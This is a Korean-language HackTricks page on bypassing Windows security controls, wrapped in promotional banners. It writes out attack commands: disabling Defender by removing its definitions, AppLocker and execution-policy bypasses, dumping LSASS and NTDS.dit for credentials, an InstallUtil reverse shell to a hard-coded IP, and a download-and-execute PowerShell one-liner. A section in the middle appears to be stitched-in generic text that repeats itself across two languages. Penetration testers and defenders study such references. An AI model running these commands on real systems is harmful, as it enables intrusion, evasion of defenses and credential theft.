# Windows 보안 제어

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)를 사용하여 세계에서 가장 **고급**인 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker 정책

응용 프로그램 화이트리스트는 시스템에 존재하고 실행되는 것이 허용되는 승인된 소프트웨어 응용 프로그램 또는 실행 파일의 목록입니다. 목표는 특정 비즈니스 요구 사항과 일치하지 않는 해로운 악성 소프트웨어 및 승인되지 않은 소프트웨어로부터 환경을 보호하는 것입니다.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)는 Microsoft의 **응용 프로그램 화이트리스트 솔루션**으로, 시스템 관리자가 **사용자가 실행할 수 있는 응용 프로그램 및 파일을 제어**할 수 있습니다. 실행 파일, 스크립트, Windows 설치 파일, DLL, 패키지 앱 및 패키지 앱 설치 프로그램에 대해 **세밀한 제어**를 제공합니다.\
조직에서는 일반적으로 cmd.exe 및 PowerShell.exe를 차단하고 특정 디렉토리에 대한 쓰기 액세스를 제한하지만, 이 모든 것을 우회할 수 있습니다.

### 확인

블랙리스트/화이트리스트에 있는 파일/확장자를 확인하세요:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
이 레지스트리 경로에는 AppLocker에 의해 적용된 구성 및 정책이 포함되어 있으며, 시스템에 적용된 현재 규칙 세트를 검토할 수 있는 방법을 제공합니다:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`


### 우회

* AppLocker 정책 우회에 유용한 **쓰기 가능한 폴더**: AppLocker가 `C:\Windows\System32` 또는 `C:\Windows` 내에서 실행을 허용하는 경우, 이를 **우회**할 수 있는 **쓰기 가능한 폴더**가 있습니다.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* 일반적으로 **신뢰할 수 있는** [**"LOLBAS"**](https://lolbas-project.github.io/) 이진 파일은 AppLocker를 우회하는 데에도 유용할 수 있습니다.
* **잘못 작성된 규칙도 우회될 수 있습니다.**
* 예를 들어, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**와 같은 경우, **`allowed`**라는 폴더를 어디에든 생성하면 허용됩니다.
* 조직은 종종 `%System32%\WindowsPowerShell\v1.0\powershell.exe` 실행 파일을 차단하는 데에 초점을 맞추지만, `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`나 `PowerShell_ISE.exe`와 같은 [**다른 PowerShell 실행 파일 위치**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations)를 잊어버립니다.
* **DLL 강제 실행은 거의 사용되지 않습니다**. 시스템에 부하를 줄 수 있고, 아무 문제가 발생하지 않도록 테스트해야 하기 때문입니다. 따라서 **DLL을 백도어로 사용하면 AppLocker를 우회하는 데 도움이 됩니다**.
* [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하여 어떤 프로세스에서든 Powershell 코드를 실행하고 AppLocker를 우회할 수 있습니다. 자세한 정보는 다음을 참조하십시오: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## 자격증명 저장

### 보안 계정 관리자 (SAM)

로컬 자격증명은 이 파일에 저장되며, 비밀번호는 해시화됩니다.

### 로컬 보안 권한 (LSA) - LSASS

**자격증명**(해시화된)은 이 서브시스템의 **메모리**에 **저장**됩니다. 이는 단일 로그인을 위한 것입니다.\
LSA는 로컬 **보안 정책**(비밀번호 정책, 사용자 권한 등), **인증**, **액세스 토큰** 관리 등을 담당합니다.\
LSA는 로컬 로그인을 위해 **SAM** 파일에서 제공된 자격증명을 **확인**하고, 도메인 사용자를 인증하기 위해 **도메인 컨트롤러**와 통신합니다.

**자격증명**은 **LSASS 프로세스** 내에 저장됩니다. 케르베로스 티켓, NT 및 LM 해시, 쉽게 해독 가능한 비밀번호 등이 포함됩니다.

### LSA 비밀

LSA는 디스크에 일부 자격증명을 저장할 수 있습니다:

* Active Directory의 컴퓨터 계정 비밀번호 (접근할 수 없는 도메인 컨트롤러).
* Windows 서비스 계정의 비밀번호
* 예약된 작업의 비밀번호
* 기타 (IIS 애플리케이션의 비밀번호 등)

### NTDS.dit

이것은 Active Directory의 데이터베이스입니다. 도메인 컨트롤러에만 존재합니다.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)는 Windows 10, Windows 11 및 Windows Server 버전에서 사용할 수 있는 백신입니다. 이는 **`WinPEAS`**와 같은 일반적인 펜테스팅 도구를 **차단**합니다. 그러나 이러한 보호 기능을 **우회하는 방법**이 있습니다.

### 확인

**Defender**의 **상태**를 확인하려면 PS cmdlet **`Get-MpComputerStatus`**를 실행하면 됩니다 (**`RealTimeProtectionEnabled`**의 값을 확인하여 활성화 여부를 알 수 있습니다):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

열거하려면 다음을 실행할 수도 있습니다:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## 암호화된 파일 시스템 (EFS)

EFS는 **대칭 키**인 **파일 암호화 키 (FEK)**를 사용하여 파일을 암호화하여 보호합니다. 이 키는 사용자의 **공개 키**로 암호화되고, 암호화된 파일의 $EFS **대체 데이터 스트림**에 저장됩니다. 복호화가 필요한 경우, 사용자의 디지털 인증서의 해당 **개인 키**를 사용하여 $EFS 스트림에서 FEK를 복호화합니다. 자세한 내용은 [여기](https://en.wikipedia.org/wiki/Encrypting_File_System)에서 확인할 수 있습니다.

**사용자의 시작 없이 복호화 시나리오**는 다음과 같습니다:

- 파일 또는 폴더가 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)와 같은 EFS 파일 시스템이 아닌 파일 시스템으로 이동되면 자동으로 복호화됩니다.
- SMB/CIFS 프로토콜을 통해 네트워크로 전송되는 암호화된 파일은 전송 전에 복호화됩니다.

이 암호화 방법은 소유자에게 암호화된 파일에 대한 **투명한 액세스**를 제공합니다. 그러나 소유자의 암호를 변경하고 로그인하는 것만으로는 복호화가 허용되지 않습니다.

**주요 포인트**:
- EFS는 사용자의 공개 키로 암호화된 대칭 FEK를 사용합니다.
- 복호화에는 사용자의 개인 키를 사용하여 FEK에 액세스합니다.
- FAT32로 복사하거나 네트워크 전송과 같은 특정 조건에서 자동 복호화가 발생합니다.
- 암호화된 파일은 소유자에게 추가 단계 없이 액세스할 수 있습니다.

### EFS 정보 확인

`C:\users\<사용자명>\appdata\roaming\Microsoft\Protect` 경로가 존재하는지 확인하여 **사용자**가 **이 서비스를 사용**했는지 확인합니다.

`cipher /c \<파일>`을 사용하여 파일에 **누가 액세스**할 수 있는지 확인할 수도 있습니다.
또한 폴더 내에서 `cipher /e` 및 `cipher /d`를 사용하여 모든 파일을 **암호화** 및 **복호화**할 수 있습니다.

### EFS 파일 복호화

#### 권한 시스템이 되기

이 방법은 **피해자 사용자**가 호스트 내에서 **프로세스를 실행** 중인 경우에만 가능합니다. 이 경우 `meterpreter` 세션을 사용하여 사용자의 프로세스의 토큰을 가장할 수 있습니다 (`incognito`의 `impersonate_token` 사용). 또는 사용자의 프로세스로 `migrate` 할 수도 있습니다.

#### 사용자의 암호를 알고 있는 경우

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## 그룹 관리 서비스 계정 (gMSA)

Microsoft는 IT 인프라에서 서비스 계정 관리를 간소화하기 위해 **그룹 관리 서비스 계정 (gMSA)**를 개발했습니다. 종래의 서비스 계정은 종종 "**암호 만료 없음**" 설정이 활성화되어 있지만, gMSA는 더 안전하고 관리 가능한 솔루션을 제공합니다:

- **자동 암호 관리**: gMSA는 도메인 또는 컴퓨터 정책에 따라 자동으로 변경되는 복잡한 240자리 암호를 사용합니다. 이 프로세스는 Microsoft의 키 배포 서비스 (KDC)가 처리하며, 수동 암호 업데이트가 필요하지 않습니다.
- **강화된 보안**: 이러한 계정은 잠금 해제에 면역이며 대화형 로그인에 사용할 수 없어 보안이 강화됩니다.
- **다중 호스트 지원**: gMSA는 여러 호스트에서 공유할 수 있어 여러 서버에서 실행되는 서비스에 이상적입니다.
- **일정 작업 기능**: 관리되는 서비스 계정과 달리 gMSA는 일정 작업 실행을 지원합니다.
- **간소화된 SPN 관리**: 시스템은 컴퓨터의 sAMaccount 세부 정보 또는 DNS 이름에 변경이 있는 경우 자동으로 서비스 주체 이름 (SPN)을 업데이트하여 SPN 관리를 간소화합니다.

gMSA의 암호는 LDAP 속성 _**msDS-ManagedPassword**_에 저장되며, 도메인 컨트롤러 (DC)에서 매 30일마다 자동으로 재설정됩니다. 이 암호는 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)라고 하는 암호화된 데이터 덩어리로, 인증된 관리자 및 gMSA가 설치된 서버만 검색할 수 있어 안전한 환경을 보장합니다. 이 정보에 액세스하려면 LDAPS와 같은 보안된 연결이 필요하거나 연결이 'Sealing & Secure'로 인증되어야 합니다.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)를 사용하여이 암호를 읽을 수 있습니다.
```
/GMSAPasswordReader --AccountName jkohler
```
**[이 게시물에서 자세한 정보를 찾을 수 있습니다](https://cube0x0.github.io/Relaying-for-gMSA/)**

또한, **NTLM 릴레이 공격**을 수행하여 **gMSA**의 **비밀번호를 읽는 방법**에 대한 [웹 페이지](https://cube0x0.github.io/Relaying-for-gMSA/)를 확인하세요.

## LAPS

**로컬 관리자 비밀번호 솔루션 (LAPS)**은 [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)에서 다운로드할 수 있으며, 로컬 관리자 비밀번호를 관리할 수 있게 해줍니다. 이러한 비밀번호는 **임의로 생성되며**, 고유하며 **정기적으로 변경**되며, Active Directory에 중앙 저장됩니다. 이러한 비밀번호에 대한 액세스는 ACL을 통해 권한이 있는 사용자에게 제한됩니다. 충분한 권한이 부여되면 로컬 관리자 비밀번호를 읽을 수 있습니다.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS 제한된 언어 모드

PowerShell [**제한된 언어 모드**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)는 PowerShell을 효과적으로 사용하기 위해 필요한 많은 기능을 **제한**합니다. 이는 COM 객체 차단, 승인된 .NET 유형만 허용, XAML 기반 워크플로우, PowerShell 클래스 등을 허용하지 않습니다.

### **확인**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### 우회

#### UAC (사용자 계정 제어) 우회

##### UAC 실행 수준 변경

UAC 실행 수준을 변경하여 UAC를 우회할 수 있습니다. 이를 위해 다음과 같은 몇 가지 방법이 있습니다.

- 레지스트리 편집을 통한 실행 수준 변경: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` 키의 `ConsentPromptBehaviorAdmin` 값을 0으로 설정합니다.
- 그룹 정책 편집을 통한 실행 수준 변경: `gpedit.msc`를 실행하여 `로컬 컴퓨터 정책 > 컴퓨터 구성 > Windows 설정 > 보안 설정 > 로컬 정책 > 보안 옵션`으로 이동한 다음, `사용자 계정 제어: 관리자 승인 모드에서 항상 관리자 승인 요청` 옵션을 비활성화합니다.

##### UAC 바이패스 도구 사용

UAC를 우회하기 위해 다양한 도구를 사용할 수 있습니다. 몇 가지 유명한 도구는 다음과 같습니다.

- `UACME`: UAC 바이패스를 위한 도구 모음입니다. 다양한 UAC 바이패스 기법을 제공합니다.
- `UAC bypass by Fodhelper`: Fodhelper.exe를 이용한 UAC 바이패스 기법입니다. Fodhelper.exe는 UAC 실행 수준이 낮은 프로세스로 실행되므로 이를 이용하여 UAC를 우회할 수 있습니다.

#### 자격 증명 탈취

##### LSASS 메모리 덤프

LSASS 메모리 덤프를 통해 시스템에서 실행 중인 프로세스의 자격 증명을 탈취할 수 있습니다. 이를 위해 다음과 같은 도구를 사용할 수 있습니다.

- `procdump`: 프로세스의 메모리 덤프를 생성하는 도구입니다. `procdump -ma lsass.exe lsass.dmp` 명령을 사용하여 LSASS 메모리 덤프를 생성할 수 있습니다.
- `mimikatz`: 메모리 덤프에서 자격 증명을 추출하는 도구입니다. `sekurlsa::minidump lsass.dmp` 명령을 사용하여 LSASS 메모리 덤프에서 자격 증명을 추출할 수 있습니다.

##### NTDS.dit 파일 탈취

NTDS.dit 파일은 Active Directory 데이터베이스 파일로, 사용자 계정의 해시를 포함하고 있습니다. 이 파일을 탈취하여 해시를 추출할 수 있습니다. 이를 위해 다음과 같은 도구를 사용할 수 있습니다.

- `ntdsutil`: NTDS.dit 파일을 복사하여 추출하는 도구입니다. `ntdsutil "ac i ntds" "ifm" "create full C:\path\to\output" q q` 명령을 사용하여 NTDS.dit 파일을 추출할 수 있습니다.
- `secretsdump.py`: NTDS.dit 파일에서 해시를 추출하는 도구입니다. `secretsdump.py -ntds ntds.dit -system SYSTEM` 명령을 사용하여 NTDS.dit 파일에서 해시를 추출할 수 있습니다.

#### EFS (암호화 파일 시스템) 우회

##### EFS 키 탈취

EFS 키를 탈취하여 암호화된 파일에 접근할 수 있습니다. 이를 위해 다음과 같은 도구를 사용할 수 있습니다.

- `mimikatz`: EFS 키를 추출하는 도구입니다. `crypto::capi` 명령을 사용하여 EFS 키를 추출할 수 있습니다.
- `EFSdump`: EFS 키를 추출하는 도구입니다. `EFSdump.exe`를 실행하여 EFS 키를 추출할 수 있습니다.
```powershell
#Easy bypass
Powershell -version 2
```
현재 Windows에서는 Bypass가 작동하지 않지만 [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)을 사용할 수 있습니다.\
**컴파일하기 위해** **참조를 추가해야 할 수도 있습니다** -> _찾아보기_ -> _찾아보기_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`을 추가하고 **프로젝트를 .Net4.5로 변경**하십시오.

#### 직접 우회:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### 리버스 쉘:

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. Reverse shells are commonly used in post-exploitation scenarios to maintain persistent access to a compromised system.

리버스 쉘은 대상 컴퓨터가 공격자의 컴퓨터로 연결을 시작하는 쉘의 한 종류입니다. 이를 통해 공격자는 대상 컴퓨터에 원격으로 접근하고 명령을 실행할 수 있습니다. 리버스 쉘은 흔히 타겟 시스템에 대한 지속적인 액세스를 유지하기 위해 포스트 익스플로잇 시나리오에서 사용됩니다.
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하여 제한된 모드를 우회하고 어떤 프로세스에서든 **PowerShell 코드를 실행**할 수 있습니다. 자세한 내용은 다음을 참조하십시오: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS 실행 정책

기본적으로 **제한**으로 설정되어 있습니다. 이 정책을 우회하는 주요 방법은 다음과 같습니다:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
더 많은 정보는 [여기](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)에서 찾을 수 있습니다.

## 보안 지원 공급자 인터페이스 (SSPI)

사용자 인증에 사용할 수 있는 API입니다.

SSPI는 통신을 원하는 두 대의 기기에 적합한 프로토콜을 찾는 역할을 합니다. 이를 위해 주로 Kerberos를 사용합니다. 그런 다음 SSPI는 어떤 인증 프로토콜을 사용할지 협상하며, 이러한 인증 프로토콜은 보안 지원 공급자(SSP)라고 불리며, 각 Windows 기기에 DLL 형태로 위치하고 있으며, 통신을 위해 두 기기가 동일한 SSP를 지원해야 합니다.

### 주요 SSP

* **Kerberos**: 기본 프로토콜
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** 및 **NTLMv2**: 호환성을 위해 사용
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: 웹 서버 및 LDAP, MD5 해시 형식의 비밀번호
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL 및 TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: 사용할 프로토콜을 협상하는 데 사용됨 (Kerberos 또는 NTLM 중 기본값은 Kerberos)
* %windir%\Windows\System32\lsasrv.dll

#### 협상은 여러 가지 방법을 제공할 수도 있고, 하나만 제공할 수도 있습니다.

## UAC - 사용자 계정 제어

[사용자 계정 제어 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)는 **권한 상승 작업에 대한 동의 프롬프트**를 활성화하는 기능입니다.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 고급스러운 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축하고 자동화**하세요.\
지금 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
